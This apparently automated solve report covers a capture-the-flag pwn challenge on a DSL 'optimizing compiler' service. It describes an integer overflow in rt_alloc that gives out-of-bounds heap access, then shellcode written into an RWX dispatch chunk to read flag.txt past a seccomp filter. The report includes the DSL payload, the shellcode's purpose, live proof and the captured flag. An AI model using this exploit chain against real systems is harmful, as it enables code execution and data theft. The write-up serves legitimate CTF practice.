# RESULT — compiler? I barely know her! [Hard Version] (slug=comphard)

STATUS: SOLVED

FLAG:
d4rk{sh3llc0de_1n_th3_b1g_26_132314}c0de

(Exact bytes on the wire, reproduced twice: `d4rk{sh3llc0de_1n_th3_b1g_26_132314}c0de\n`.
The runtime flag.txt really does carry the trailing `c0de` after the closing brace — confirmed
from a `repr` of the raw socket output, not a paste artifact.)

## MECHANISM

Surface: the service is an "optimizing compiler". You submit a tiny DSL program
(`dslc` → LLVM IR); the server links it against `runtime.o` with an LLVM-22 pass plugin
(`compilerIBarelyKnowHerHard.so`) and runs the result inside a seccomp sandbox.

Three facts, all recovered by reading the handout:

1. **Runtime integer overflow in `rt_alloc` (the actual bug).** `runtime.o::rt_alloc(nelems)`:
 `size = nelems * 8` (mod 2^64) but the *length* stored in the descriptor is the raw
 `nelems`. Choosing `nelems = 0x2000000000000000` (2^61) makes `nelems*8 = 2^64 ≡ 0`, so the
 data allocation is `malloc(1)`, while `desc->len` becomes 2^61. Every `b[i]` access is
 bounds-checked against `desc->len`, so `b[i]` for huge `i` is "in bounds" → arbitrary
 read/write relative to the tiny heap chunk. (dslc emits the check as
 `select ok, data+8*i, inttoptr(1)`, i.e. truly unchecked once `len` is huge.)

2. **Buffer data pages are RWX.** `rt_alloc` calls `make_rwx(data, size)` (mprotect RWX) on the
 data pointer of every buffer.

3. **`register(f)` gives a code-execution hook, and `rt_finish` *calls the dispatch chunk
 itself*.** Hard `rt_register` mallocs a 0x100-byte chunk (`g_dispatch`), zeroes it, sets
 **byte 0 to `0xc3` (`ret`)**, and `make_rwx`s it. At exit `rt_finish` does
 `call QWORD PTR [&g_dispatch]` — i.e. it jumps to the **address of the `g_dispatch`
 chunk** (a `ret` stub in the hard build). Overwrite the chunk's bytes with shellcode and the
 exit path executes it. (This was the key subtlety: it calls the *chunk address*, not
 `*(void**)chunk` — see comphard-harness3 vs comphard-harness9 below.)

4. **The sandbox does not block the file I/O we need.** The 35-instruction seccomp filter
 (extracted from `runtime.o` `.rodata`) only *allows* read/write/open/openat/close/lseek/
 fstat/newfstatat/mmap/munmap/mprotect/brk/rt_sigreturn/exit/exit_group and `KILL_PROCESS`es
 everything else (arch-gated). `open`+`read`+`write` are permitted, so shellcode can read
 `flag.txt` (the handler `cp`s it into the program's cwd) with plain syscalls.

The LLVM-22 plugin is a forward store→load value propagator
(`compilerIBarelyKnowHer...Forwarder::runOnBlock`) that omits call-clobber invalidation; it is
not needed for this chain (the exploit lives in the runtime), so no plugin-specific trick was
required.

### Heap layout (deterministic; no frees ⇒ contiguous top-chunk allocations)

```
D = data_b (alloc(2^61) -> 0x20-byte data chunk, len = 2^61)
D+0x20 = desc_c (alloc(8))
D+0x40 = data_c
D+0x90 = g_dispatch payload -> b[18] (validated locally with the target libc)
```
So `b[18..25]` are exactly the 64 bytes of the `g_dispatch` chunk. Writing the shellcode there
is all that is needed; `rt_finish` then jumps into it.

### Payload (comphard-payload.dsl)

```
fn f { return 0; }
let b = alloc(0x2000000000000000); // len = 2^61, but only 1 byte allocated -> OOB window
let c = alloc(8); // keeps g_dispatch at index 18
register(f); // malloc+make_rwx the g_dispatch (0x100) chunk
b[18] = 7811136522987516232; ... b[25] = -8029759187366969551; // shellcode INTO g_dispatch
```

Shellcode (64 bytes): `open("flag.txt",0); read(fd,rsp,0x100); write(1,rsp,n); exit(0)`.

## PROOF (live nc, twice, gentle — one submit per connection)

```
$ python3 comphard-send2.py
banner b'== h4ckc0n :: compiler I barely know her ==\n 1) easy\n 2) hard\nchoice> '
after2 b'== optimizing compiler :: HARD ==\nSend your .dsl program, then a line with __EOF__ ...'
RAW OUTPUT: b'== compiling ==\n== running ==\nd4rk{sh3llc0de_1n_th3_b1g_26_132314}c0de\n== done ==\n'
```

Offline proof of every primitive/chain step (target `libc.so.6` + `ld-linux` from the handout):

```
$ gcc -O0 -o comphard-harness2 comphard-harness2.c handout/runtime.o
$ ./handout/ld-linux-x86-64.so.2 --library-path handout ./comphard-harness2
D=0x5555706b72c0 data_c=0x5555706b7300
b[ 4] = 0x00005555706b7300 # data_c
b[18] = 0x00000000000000c3 # g_dispatch chunk first qword (the ret stub)

$ gcc -O0 -o comphard-h9 comphard-h9.c handout/runtime.o # shellcode written into g_dispatch
$ ./handout/ld-linux-x86-64.so.2 --library-path handout ./comphard-h9
d4rk{LOCAL_TEST_FLAG_comphard}
```
(`comphard-harness3`, which instead overwrote the chunk with a *pointer*, segfaulted — that
disproved the `*(g_dispatch)` reading and proved `rt_finish` jumps to the chunk address.)

## ARTIFACTS (all under .../comphard-work/, slug-prefixed)

- `comphard-work/comphard-payload.dsl` — final DSL payload
- `comphard-work/comphard-solve.py` — payload generator + sender (also writes .dsl)
- `comphard-work/comphard-send2.py` — raw-bytes re-verify sender
- `comphard-work/comphard-remote-transcript.txt`, `comphard-remote-transcript2.txt` — nc transcripts
- `comphard-work/comphard-harness*.c`, `comphard-h7.c`, `comphard-h8.c`, `comphard-h9.c` — offline harnesses
 (h2 = layout, h8 = seccomp allows open/read/write, h9 = full chain with target libc)
- `comphard-work/comphard-mkshell.py` — shellcode/DSL builder
- extracted handout under `comphard-work/handout/`
